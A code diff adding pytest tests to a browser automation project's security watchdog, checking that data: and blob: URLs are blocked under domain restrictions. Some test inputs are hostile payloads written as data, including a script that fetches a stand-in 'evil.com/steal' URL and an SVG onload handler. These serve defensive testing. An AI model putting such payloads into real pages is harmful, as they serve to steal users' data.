@@ -567,3 +567,152 @@ class TestDomainListOptimization:
 		# Should work correctly
 		assert watchdog._is_url_allowed('https://blocked0.com') is False
 		assert watchdog._is_url_allowed('https://example.com') is True
+
+
+class TestDataBlobUrlSecurity:
+	"""Tests for data: and blob: URL security in _is_url_allowed.
+
+	When no domain restrictions are configured, data: and blob: URLs should
+	be allowed (backward-compatible). When allowed_domains or
+	prohibited_domains is set, data: URLs must be blocked (they can carry
+	arbitrary HTML/JS that exfiltrates data) and blob: URLs must check
+	their origin domain against the allowlist.
+	"""
+
+	def test_data_url_allowed_when_no_domain_restrictions(self):
+		"""data: URLs are allowed when no allowed_domains/prohibited_domains set."""
+		from bubus import EventBus
+
+		from browser_use.browser.watchdogs.security_watchdog import SecurityWatchdog
+
+		browser_profile = BrowserProfile(headless=True, user_data_dir=None)
+		browser_session = BrowserSession(browser_profile=browser_profile)
+		event_bus = EventBus()
+		watchdog = SecurityWatchdog(browser_session=browser_session, event_bus=event_bus)
+
+		assert watchdog._is_url_allowed('data:text/html,Hello World') is True
+		assert watchdog._is_url_allowed('data:image/png;base64,iVBORw0KGgo=') is True
+		assert watchdog._is_url_allowed('data:text/plain,test') is True
+
+	def test_data_url_blocked_when_allowed_domains_set(self):
+		"""data: URLs are blocked when allowed_domains is configured."""
+		from bubus import EventBus
+
+		from browser_use.browser.watchdogs.security_watchdog import SecurityWatchdog
+
+		browser_profile = BrowserProfile(allowed_domains=['example.com'], headless=True, user_data_dir=None)
+		browser_session = BrowserSession(browser_profile=browser_profile)
+		event_bus = EventBus()
+		watchdog = SecurityWatchdog(browser_session=browser_session, event_bus=event_bus)
+
+		# data: URLs should be blocked
+		assert watchdog._is_url_allowed('data:text/html,<script>fetch("https://evil.com/steal")</script>') is False
+		assert watchdog._is_url_allowed('data:image/svg+xml,<svg onload="evil()">') is False
+
+		# Normal allowed URLs still work
+		assert watchdog._is_url_allowed('https://example.com') is True
+		assert watchdog._is_url_allowed('https://example.com/path') is True
+
+	def test_data_url_blocked_when_prohibited_domains_set(self):
+		"""data: URLs are blocked when prohibited_domains is configured."""
+		from bubus import EventBus
+
+		from browser_use.browser.watchdogs.security_watchdog import SecurityWatchdog
+
+		browser_profile = BrowserProfile(prohibited_domains=['evil.com'], headless=True, user_data_dir=None)
+		browser_session = BrowserSession(browser_profile=browser_profile)
+		event_bus = EventBus()
+		watchdog = SecurityWatchdog(browser_session=browser_session, event_bus=event_bus)
+
+		# data: URLs should be blocked even with only prohibited_domains
+		assert watchdog._is_url_allowed('data:text/html,<script>exfiltrate()</script>') is False
+
+		# Normal URLs still work
+		assert watchdog._is_url_allowed('https://example.com') is True
+		assert watchdog._is_url_allowed('https://evil.com') is False
+
+	def test_blob_url_allowed_when_no_domain_restrictions(self):
+		"""blob: URLs are allowed when no domain restrictions are set."""
+		from bubus import EventBus
+
+		from browser_use.browser.watchdogs.security_watchdog import SecurityWatchdog
+
+		browser_profile = BrowserProfile(headless=True, user_data_dir=None)
+		browser_session = BrowserSession(browser_profile=browser_profile)
+		event_bus = EventBus()
+		watchdog = SecurityWatchdog(browser_session=browser_session, event_bus=event_bus)
+
+		assert watchdog._is_url_allowed('blob:https://example.com/uuid-here') is True
+		assert watchdog._is_url_allowed('blob:https://any-domain.com/random-id') is True
+
+	def test_blob_url_allowed_when_origin_in_allowed_domains(self):
+		"""blob: URLs with origin matching allowed_domains should be allowed."""
+		from bubus import EventBus
+
+		from browser_use.browser.watchdogs.security_watchdog import SecurityWatchdog
+
+		browser_profile = BrowserProfile(allowed_domains=['example.com'], headless=True, user_data_dir=None)
+		browser_session = BrowserSession(browser_profile=browser_profile)
+		event_bus = EventBus()
+		watchdog = SecurityWatchdog(browser_session=browser_session, event_bus=event_bus)
+
+		# blob: URL with origin matching allowed domain
+		assert watchdog._is_url_allowed('blob:https://example.com/some-uuid') is True
+
+	def test_blob_url_blocked_when_origin_not_in_allowed_domains(self):
+		"""blob: URLs with origin NOT in allowed_domains should be blocked."""
+		from bubus import EventBus
+
+		from browser_use.browser.watchdogs.security_watchdog import SecurityWatchdog
+
+		browser_profile = BrowserProfile(allowed_domains=['example.com'], headless=True, user_data_dir=None)
+		browser_session = BrowserSession(browser_profile=browser_profile)
+		event_bus = EventBus()
+		watchdog = SecurityWatchdog(browser_session=browser_session, event_bus=event_bus)
+
+		# blob: URL with origin NOT matching allowed domain
+		assert watchdog._is_url_allowed('blob:https://evil.com/malicious-uuid') is False
+
+	def test_blob_url_blocked_when_origin_has_no_hostname(self):
+		"""blob: URLs with no recognizable origin host should be blocked when restrictions active."""
+		from bubus import EventBus
+
+		from browser_use.browser.watchdogs.security_watchdog import SecurityWatchdog
+
+		browser_profile = BrowserProfile(allowed_domains=['example.com'], headless=True, user_data_dir=None)
+		browser_session = BrowserSession(browser_profile=browser_profile)
+		event_bus = EventBus()
+		watchdog = SecurityWatchdog(browser_session=browser_session, event_bus=event_bus)
+
+		# stripped blob: URL leaves just a path — no hostname → blocked
+		assert watchdog._is_url_allowed('blob:d8329a09-e2f5-46f1-a830-1c0de82c44a9') is False
+
+	def test_regular_urls_unaffected_by_data_blob_fix(self):
+		"""Regular http/https URLs continue to work normally."""
+		from bubus import EventBus
+
+		from browser_use.browser.watchdogs.security_watchdog import SecurityWatchdog
+
+		browser_profile = BrowserProfile(allowed_domains=['example.com'], headless=True, user_data_dir=None)
+		browser_session = BrowserSession(browser_profile=browser_profile)
+		event_bus = EventBus()
+		watchdog = SecurityWatchdog(browser_session=browser_session, event_bus=event_bus)
+
+		assert watchdog._is_url_allowed('https://example.com') is True
+		assert watchdog._is_url_allowed('https://example.com/page?q=1') is True
+		assert watchdog._is_url_allowed('https://not-allowed.com') is False
+
+	def test_internal_urls_still_allowed_with_restrictions(self):
+		"""Internal browser URLs like about:blank are still allowed even with domain restrictions."""
+		from bubus import EventBus
+
+		from browser_use.browser.watchdogs.security_watchdog import SecurityWatchdog
+
+		browser_profile = BrowserProfile(allowed_domains=['example.com'], headless=True, user_data_dir=None)
+		browser_session = BrowserSession(browser_profile=browser_profile)
+		event_bus = EventBus()
+		watchdog = SecurityWatchdog(browser_session=browser_session, event_bus=event_bus)
+
+		assert watchdog._is_url_allowed('about:blank') is True
+		assert watchdog._is_url_allowed('chrome://new-tab-page/') is True
+		assert watchdog._is_url_allowed('chrome://new-tab-page') is True
